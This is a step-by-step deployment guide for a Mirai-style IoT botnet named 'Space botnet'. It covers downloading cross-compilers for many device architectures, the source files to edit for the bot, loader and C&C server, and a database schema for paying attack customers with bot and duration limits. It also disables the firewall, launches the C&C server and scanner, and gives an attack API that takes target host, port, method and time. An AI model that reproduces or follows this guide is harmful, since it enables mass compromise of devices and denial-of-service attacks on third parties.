Space botnet
Made by Try999_9
use ubuntu 22.04

------------------------------------------------------------------------------------

apt update -y
apt-get update -y
apt install software-properties-common -y
apt install build-essential -y
apt install libgmp-dev -y
ln -s /usr/lib/x86_64-linux-gnu/libgmp.so.10 /usr/lib/x86_64-linux-gnu/libgmp.so.3
apt-get install screen wget bzip2 gcc nano g++ electric-fence sudo git libc6-dev apache2 xinetd tftpd-hpa mysql-server -y
apt-get install php
sudo apt install python3  -y 
python3 --version
sudo apt install python3-pip -y 
sudo apt install build-essential libssl-dev libffi-dev python3-dev  -y
sudo update-alternatives --install /usr/bin/python python /usr/bin/python3 1
sudo update-alternatives --config python

------------------------------------------------------------------------------------

mkdir /etc/xcompile
cd /etc/xcompile

wget https://github.com/foss-for-synopsys-dwc-arc-processors/toolchain/releases/download/arc-2017.09-release/arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install.tar.gz
wget https://landley.net/aboriginal/downloads/old/binaries/1.4.5/cross-compiler-x86_64.tar.gz
wget https://landley.net/aboriginal/downloads/old/binaries/1.4.5/cross-compiler-i586.tar.gz
wget https://landley.net/aboriginal/downloads/old/binaries/1.4.5/cross-compiler-i686.tar.gz
wget https://landley.net/aboriginal/downloads/old/binaries/1.4.5/cross-compiler-m68k.tar.gz
wget https://landley.net/aboriginal/downloads/old/binaries/1.4.5/cross-compiler-mips.tar.gz
wget https://landley.net/aboriginal/downloads/old/binaries/1.4.5/cross-compiler-mips64.tar.gz
wget https://landley.net/aboriginal/downloads/old/binaries/1.4.5/cross-compiler-mipsel.tar.gz
wget https://landley.net/aboriginal/downloads/old/binaries/1.4.5/cross-compiler-powerpc.tar.gz
wget https://landley.net/aboriginal/downloads/old/binaries/1.4.5/cross-compiler-sh4.tar.gz
wget https://landley.net/aboriginal/downloads/old/binaries/1.4.5/cross-compiler-sparc.tar.gz
wget https://landley.net/aboriginal/downloads/old/binaries/1.4.5/cross-compiler-armv4l.tar.gz
wget https://landley.net/aboriginal/downloads/old/binaries/1.4.5/cross-compiler-armv5l.tar.gz
wget https://landley.net/aboriginal/downloads/old/binaries/1.4.5/cross-compiler-armv6l.tar.gz
wget https://mirailovers.io/HELL-ARCHIVE/COMPILERS/cross-compiler-armv7l.tar.bz2

tar -xf arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install.tar.gz
tar -xf cross-compiler-x86_64.tar.gz
tar -xf cross-compiler-i586.tar.gz
tar -xf cross-compiler-i686.tar.gz
tar -xf cross-compiler-m68k.tar.gz
tar -xf cross-compiler-mips.tar.gz
tar -xf cross-compiler-mipsel.tar.gz
tar -xf cross-compiler-powerpc.tar.gz
tar -xf cross-compiler-sh4.tar.gz
tar -xf cross-compiler-sparc.tar.gz
tar -xf cross-compiler-armv4l.tar.gz
tar -xf cross-compiler-armv5l.tar.gz
tar -xf cross-compiler-armv6l.tar.gz
tar -jxf cross-compiler-armv7l.tar.bz2

rm -rf *.tar.gz
rm -rf *.tar.bz2

mv arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install arc
mv cross-compiler-x86_64 x86_64
mv cross-compiler-i586 i586
mv cross-compiler-i686 i686
mv cross-compiler-m68k m68k
mv cross-compiler-mips mips
mv cross-compiler-mipsel mipsel
mv cross-compiler-powerpc powerpc
mv cross-compiler-sh4 sh4
mv cross-compiler-sparc sparc
mv cross-compiler-armv4l armv4l
mv cross-compiler-armv5l armv5l
mv cross-compiler-armv6l armv6l
mv cross-compiler-armv7l armv7l

------------------------------------------------------------------------------------

scanListen.go
loader/src/main.c
loader/src/header/config.h
dlr/main.c change . to ,
cnc/main.go
bot/includes.h

------------------------------------------------------------------------------------

// We will setup the database, run these commands on your terminal:

apt-get install mariadb-server -y
systemctl start mariadb.service
mysql_secure_installation

Password SQL : Ursqlpass
mysql -u root -pUrsqlpass

CREATE DATABASE Space;
use Space;

CREATE TABLE `history` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` int(10) unsigned NOT NULL,
  `time_sent` int(10) unsigned NOT NULL,
  `duration` int(10) unsigned NOT NULL,
  `command` text NOT NULL,
  `max_bots` int(11) DEFAULT '-1',
  PRIMARY KEY (`id`),
  KEY `user_id` (`user_id`)
);
 
CREATE TABLE `users` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(32) NOT NULL,
  `password` varchar(32) NOT NULL,
  `duration_limit` int(10) unsigned DEFAULT NULL,
  `cooldown` int(10) unsigned NOT NULL,
  `wrc` int(10) unsigned DEFAULT NULL,
  `last_paid` int(10) unsigned NOT NULL,
  `max_bots` int(11) DEFAULT '-1',
  `admin` int(10) unsigned DEFAULT '0',
  `intvl` int(10) unsigned DEFAULT '30',
  `api_key` text,
  `online` TINYINT(1) NOT NULL DEFAULT 0,
  PRIMARY KEY (`id`),
  KEY `username` (`username`)
);
 
CREATE TABLE `whitelist` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `prefix` varchar(16) DEFAULT NULL,
  `netmask` tinyint(3) unsigned DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `prefix` (`prefix`)
);

CREATE TABLE `counters` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `online_count` int(10) unsigned NOT NULL DEFAULT 0,
  PRIMARY KEY (`id`)
);

INSERT INTO counters (online_count) VALUES (0);
INSERT INTO users VALUES (NULL, 'username', 'password', 0, 0, 0, 0, -1, 1, 30, 'apikey', 0);
exit;

------------------------------------------------------------------------------------

service iptables stop 
service apache2 restart  
service mariadb restart

------------------------------------------------------------------------------------

wget https://go.dev/dl/go1.23.2.linux-amd64.tar.gz
rm -rf /usr/local/go && tar -C /usr/local -xzf go1.23.2.linux-amd64.tar.gz
export PATH=$PATH:/usr/local/go/bin
export GOROOT=/usr/local/go
cd ~/
go version
go env
go mod init try999_9
go get github.com/go-sql-driver/mysql
go get github.com/mattn/go-shellwords

------------------------------------------------------------------------------------

nano /usr/include/x86_64-linux-gnu/bits/typesizes.h
ulimit -n999999; ulimit -u999999; ulimit -e999999

------------------------------------------------------------------------------------

cd ~/
chmod 777 *
bash build.sh

------------------------------------------------------------------------------------

// Run cnc
screen ./cnc

// Run scanlisten
cd loader
screen ./scanListen

C&C Port: 3778

//Api
http://ip/api.php?key=apikey&host=[host]&port=[port]&method=[method]&time=[time]

